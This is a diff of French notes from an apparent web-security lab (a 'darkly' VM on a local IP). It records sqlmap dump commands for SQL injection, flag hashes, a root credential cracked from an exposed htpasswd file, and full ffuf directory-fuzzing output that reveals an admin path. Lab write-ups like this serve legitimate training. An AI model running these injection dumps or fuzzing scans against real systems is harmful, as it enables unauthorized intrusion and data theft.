@@ -22,13 +22,13 @@ Remplacons le cookie
 vulnerable a l'injection sql
 sqlmap --batch --dump -u <curl requete> --level=5 --risk=3 --technique=BEU
 echo 1928e8083cf461a51303633093573c46 | sha2
-~flag - 0dc499fbaa964a62c8b9ee5918e08a3387595e3d0c0cf0650e289e3a3e9a427a~
+~flag - fe0ca5dd7978ae1baae2c1c19d49fbfbb37fe7905b9ad386cbbb8206c8422de6~
 
 * Search users :
 injection sql comme image
 
 echo 5ff9d0165b4f92b14994e5c685cdce28 | sha2
-~flag - be7803fb10d8ae560da023739a9847c370fca422f990bbb519cea9e85c45c32b~
+~flag - 3b4e8a30ecbfde518f50f2bda1912b40338ecd71821faeb1e9cdf44cefff95f5~
 
 * Source page :
 ?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c
@@ -38,6 +38,12 @@ echo 5ff9d0165b4f92b14994e5c685cdce28 | sha2
 root - shadow =
 b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2
 
+* Fuzzing :
+
+url/whatever - htpasswd http://192.168.56.102/whatever/htpasswdd
+root:8621ffdbc5698829397d97767ac13db3 - dragon
+go to url/admin
+~flag d19b4823e0d5600ceed56d5e896ef328d7a2b9e7ac7e80f4fcdb9b10bcb3e7ff~
 
 
 
@@ -90,3 +96,52 @@ Table: vote_dbs
 | subject | varchar(255) |
 | vote    | float        |
 +---------+--------------+
+
+
+λ ~/gitlab/darkly/ main* ffuf -w ~/tmp/directory-list-2.3-medium.txt -u 'http://192.168.56.102/FUZZ'
+
+        /'___\  /'___\           /'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v1.3.1-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://192.168.56.102/FUZZ
+ :: Wordlist         : FUZZ: /Users/paure/tmp/directory-list-2.3-medium.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+________________________________________________
+
+#                       [Status: 200, Size: 6892, Words: 616, Lines: 130]
+# directory-list-2.3-medium.txt [Status: 200, Size: 6892, Words: 616, Lines: 130]
+                        [Status: 200, Size: 6892, Words: 616, Lines: 130]
+# Attribution-Share Alike 3.0 License. To view a copy of this [Status: 200, Size: 6892, Words: 616, Lines: 130]
+#                       [Status: 200, Size: 6892, Words: 616, Lines: 130]
+images                  [Status: 301, Size: 184, Words: 6, Lines: 8]
+# Copyright 2007 James Fisher [Status: 200, Size: 6892, Words: 616, Lines: 130]
+# or send a letter to Creative Commons, 171 Second Street, [Status: 200, Size: 6892, Words: 616, Lines: 130]
+# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 6892, Words: 616, Lines: 130]
+#                       [Status: 200, Size: 6892, Words: 616, Lines: 130]
+admin                   [Status: 301, Size: 184, Words: 6, Lines: 8]
+# Priority ordered case-sensitive list, where entries were found [Status: 200, Size: 6892, Words: 616, Lines: 130]
+#                       [Status: 200, Size: 6892, Words: 616, Lines: 130]
+# on at least 2 different hosts [Status: 200, Size: 6892, Words: 616, Lines: 130]
+audio                   [Status: 301, Size: 184, Words: 6, Lines: 8]
+css                     [Status: 301, Size: 184, Words: 6, Lines: 8]
+includes                [Status: 301, Size: 184, Words: 6, Lines: 8]
+js                      [Status: 301, Size: 184, Words: 6, Lines: 8]
+# This work is licensed under the Creative Commons [Status: 200, Size: 6892, Words: 616, Lines: 130]
+# license, visit http://creativecommons.org/licenses/by-sa/3.0/ [Status: 200, Size: 6892, Words: 616, Lines: 130]
+fonts                   [Status: 301, Size: 184, Words: 6, Lines: 8]
+errors                  [Status: 301, Size: 184, Words: 6, Lines: 8]
+whatever                [Status: 301, Size: 184, Words: 6, Lines: 8]
+                        [Status: 200, Size: 6892, Words: 616, Lines: 130]
+:: Progress: [220560/220560] :: Job [1/1] :: 2313 req/sec :: Duration: [0:00:51] :: Errors: 0 ::
